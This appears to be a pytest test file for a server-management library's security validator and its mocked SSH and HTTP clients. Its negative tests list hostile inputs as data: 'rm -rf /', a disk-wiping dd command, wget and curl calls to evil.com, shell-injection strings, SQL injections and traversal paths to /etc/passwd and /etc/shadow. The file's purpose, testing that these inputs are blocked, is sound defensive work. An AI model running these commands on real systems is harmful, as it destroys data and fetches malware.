"""
Tests for server-management-lib

Covers:
- Configuration loading
- Security validation (device names, service names, commands, queries, paths)
- SSH manager (mocked)
- HTTP clients (mocked)
"""

import asyncio
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from server_management_lib.config import DEFAULT_CONFIG, load_config
from server_management_lib.http_clients import InfluxDBClient, PrometheusClient
from server_management_lib.security import SecurityValidator
from server_management_lib.ssh_manager import SSHManager

# ============================================================================
# Configuration Tests
# ============================================================================


class TestConfiguration:
    """Test configuration loading."""

    def test_default_config_has_all_sections(self):
        """Default config must have all expected sections."""
        assert "ssh" in DEFAULT_CONFIG
        assert "security" in DEFAULT_CONFIG
        assert "host" in DEFAULT_CONFIG
        assert "influxdb" in DEFAULT_CONFIG
        assert "prometheus" in DEFAULT_CONFIG

    def test_default_security_settings(self):
        """Generic command execution must be disabled by default."""
        assert DEFAULT_CONFIG["security"]["allow_generic_commands"] is False

    def test_load_example_config(self):
        """Example config file should load without error."""
        example_path = Path(__file__).parent.parent / "config.example.yaml"
        if example_path.exists():
            config = load_config(example_path)
            assert "ssh" in config
            assert "security" in config


# ============================================================================
# Security - Device Name Validation
# ============================================================================


class TestDeviceNameValidation:
    """Test block device name validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_names(self):
        valid = ["sda", "sdb", "nvme0n1", "nvme1n2", "vda", "hda", "mmcblk0", "dm-0"]
        for name in valid:
            assert self.security.validate_device_name(name) is True

    def test_invalid_names(self):
        invalid = [
            "",
            "sda;rm -rf /",
            "sda$(whoami)",
            "../../etc",
            "/dev/sda",
            "a" * 33,
            None,
        ]
        for name in invalid:
            assert self.security.validate_device_name(name) is False  # type: ignore[arg-type]


# ============================================================================
# Security - Service Name Validation
# ============================================================================


class TestServiceNameValidation:
    """Test service name validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_names(self):
        valid = [
            "myapp",
            "my-app",
            "my_app",
            "MyApp123",
            "service-01",
            "a",
            "a" * 100,
        ]
        for name in valid:
            assert self.security.validate_service_name(name) is True

    def test_invalid_names(self):
        invalid = [
            "",
            "my app",
            "my/app",
            "../etc",
            "app;rm -rf /",
            "-help",
            "_service",
            None,
        ]
        for name in invalid:
            assert self.security.validate_service_name(name) is False  # type: ignore[arg-type]


# ============================================================================
# Security - Command Safety
# ============================================================================


class TestCommandSafety:
    """Test command safety validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_disk_safe_commands_accepted(self):
        """Disk diagnostic commands must pass the whitelist."""
        safe = [
            "smartctl -a /dev/sda",
            "smartctl -j -a /dev/sda",
            "smartctl -t short /dev/sda 2>&1",
            "smartctl -t long /dev/sda 2>&1",
            "lsblk -d -o NAME,MODEL,SERIAL,SIZE,TYPE,TRAN --json 2>&1",
            "zpool status -x 2>&1 && echo '---' && zpool list -o name,size 2>&1",
            "cat /proc/mdstat 2>&1 && echo '---' && mdadm --detail --scan 2>&1",
            "iostat -x 1 1 2>&1",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True, f"Should accept: {cmd}"

    def test_general_safe_commands_accepted(self):
        """General safe commands (non-disk whitelist) must pass."""
        safe = [
            "docker ps",
            "docker logs myapp",
            "uptime",
            "free -h",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True, f"Should accept: {cmd}"

    def test_dangerous_commands_blocked(self):
        """Dangerous commands must always be blocked."""
        dangerous = [
            "sudo smartctl -a /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            "rm -rf /",
            "bash /tmp/evil.sh",
            "wget http://evil.com/malware",
            "curl http://evil.com/exploit",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False, f"Should block: {cmd}"

    def test_redirect_outside_2and1_blocked(self):
        """Output redirection (except 2>&1) must be blocked for disk commands."""
        dangerous = [
            "smartctl -a /dev/sda > /dev/sda",
            "smartctl -j -a /dev/sda > /tmp/evil",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False


# ============================================================================
# Security - File Path Validation
# ============================================================================


class TestFilePathValidation:
    """Test service file path validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_paths(self):
        valid = [
            ("myapp", "docker-compose.yml"),
            ("myapp", "config/app.conf"),
            ("myapp", "logs/app.log"),
        ]
        for service, path in valid:
            result = self.security.validate_service_file_path(service, path)
            assert result is not None, f"Should accept: {path}"

    def test_traversal_blocked(self):
        attacks = [
            ("myapp", "../etc/passwd"),
            ("myapp", "../../etc/shadow"),
            ("myapp", "/etc/passwd"),
        ]
        for service, path in attacks:
            result = self.security.validate_service_file_path(service, path)
            assert result is None, f"Should block: {path}"

    def test_sensitive_files_blocked(self):
        sensitive = [
            ("myapp", ".env"),
            ("myapp", "secrets/password.txt"),
            ("myapp", "keys/server.key"),
        ]
        for service, path in sensitive:
            result = self.security.validate_service_file_path(service, path)
            assert result is None, f"Should block sensitive file: {path}"


# ============================================================================
# Security - Query Validation
# ============================================================================


class TestInfluxDBQueryValidation:
    """Test InfluxDB SQL query validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_queries(self):
        valid = [
            "SELECT * FROM cpu WHERE time > now() - INTERVAL '1 hour' LIMIT 5",
            "SELECT mean(value) FROM metrics GROUP BY host",
        ]
        for q in valid:
            assert self.security.validate_influxdb_query(q) is not None

    def test_write_ops_blocked(self):
        write_ops = [
            "DROP MEASUREMENT cpu",
            "DELETE FROM metrics",
            "INSERT INTO cpu VALUES (1)",
        ]
        for q in write_ops:
            assert self.security.validate_influxdb_query(q) is None

    def test_injection_blocked(self):
        injections = [
            "SELECT * FROM cpu; DROP TABLE metrics",
            "SELECT * FROM cpu -- comment",
            "SELECT * FROM cpu `whoami`",
        ]
        for q in injections:
            assert self.security.validate_influxdb_query(q) is None


class TestPrometheusQueryValidation:
    """Test PromQL query validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_queries(self):
        valid = [
            "up",
            "rate(http_requests_total[5m])",
        ]
        for q in valid:
            assert self.security.validate_prometheus_query(q) is not None

    def test_injection_blocked(self):
        injections = [
            "up; cat /etc/passwd",
            "`whoami`",
            "$(rm -rf /)",
            "up{job='test'}",
        ]
        for q in injections:
            assert self.security.validate_prometheus_query(q) is None


# ============================================================================
# Security - Search Pattern Sanitization
# ============================================================================


class TestSearchPatternSanitization:
    """Test search pattern sanitization."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_safe_patterns_preserved(self):
        safe = ["error", "connection failed", "timeout", "192.168.1.1"]
        for p in safe:
            assert self.security.sanitize_search_pattern(p) == p

    def test_dangerous_patterns_sanitized(self):
        result = self.security.sanitize_search_pattern("'; rm -rf /")
        assert "'" not in result
        assert ";" not in result

    def test_empty_pattern_raises(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern("';|&$")


# ============================================================================
# SSH Manager (Mocked)
# ============================================================================


class TestSSHManagerMock:
    """Test SSHManager with mocked connections."""

    @pytest.fixture
    def config(self):
        return {
            "ssh": {
                "host": "localhost",
                "port": 22,
                "username": "test",
                "key_path": None,
            },
            "security": {"services_path": "/srv"},
        }

    @pytest.fixture
    def security(self, config):
        return SecurityValidator(config)

    def test_manager_created(self, config, security):
        manager = SSHManager(config, security)
        assert manager.connection is None
        assert manager._connected is False

    def test_connect_failure(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            with patch("server_management_lib.ssh_manager.asyncssh.connect") as mock:
                mock.side_effect = Exception("Connection refused")
                with pytest.raises(Exception, match="Connection refused"):
                    await manager.connect()

        asyncio.run(run())

    def test_execute_safe_command(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = True

            mock_conn = AsyncMock()
            mock_conn.run.return_value = MagicMock(
                stdout="hello", stderr="", exit_status=0
            )
            manager.connection = mock_conn

            result = await manager.execute_safe_command("echo hello")
            assert "hello" in result

        asyncio.run(run())

    def test_unsafe_command_blocked(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = True
            manager.connection = AsyncMock()

            result = await manager.execute_safe_command("rm -rf /")
            assert "Security violation" in result or "❌" in result

        asyncio.run(run())


# ============================================================================
# HTTP Clients (Mocked)
# ============================================================================


class TestInfluxDBClientMock:
    """Test InfluxDBClient with mocked HTTP responses."""

    def test_no_database_error(self):
        client = InfluxDBClient(host="localhost", database=None)

        async def run():
            result = await client.query("SELECT * FROM cpu")
            assert "No database" in result

        asyncio.run(run())

    def test_query_success(self):
        client = InfluxDBClient(host="localhost", database="testdb", token="fake-token")

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value=[{"time": "2024-01-01"}])

            mock_cm = AsyncMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.post.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("SELECT * FROM cpu LIMIT 1")
                assert "Query successful" in result

        asyncio.run(run())


class TestPrometheusClientMock:
    """Test PrometheusClient with mocked HTTP responses."""

    def test_query_success(self):
        client = PrometheusClient(host="localhost", port=9090)

        async def run():
            mock_response = MagicMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(
                return_value={"status": "success", "data": {"resultType": "vector"}}
            )

            mock_cm = MagicMock()
            mock_cm.__aenter__ = AsyncMock(return_value=mock_response)
            mock_cm.__aexit__ = AsyncMock(return_value=None)

            mock_session = MagicMock()
            mock_session.get.return_value = mock_cm
            mock_session.__aenter__ = AsyncMock(return_value=mock_session)
            mock_session.__aexit__ = AsyncMock(return_value=None)

            with patch(
                "server_management_lib.http_clients.aiohttp.ClientSession",
                return_value=mock_session,
            ):
                result = await client.query("up")
                assert "Query successful" in result

        asyncio.run(run())


# ============================================================================
# Run Tests
# ============================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
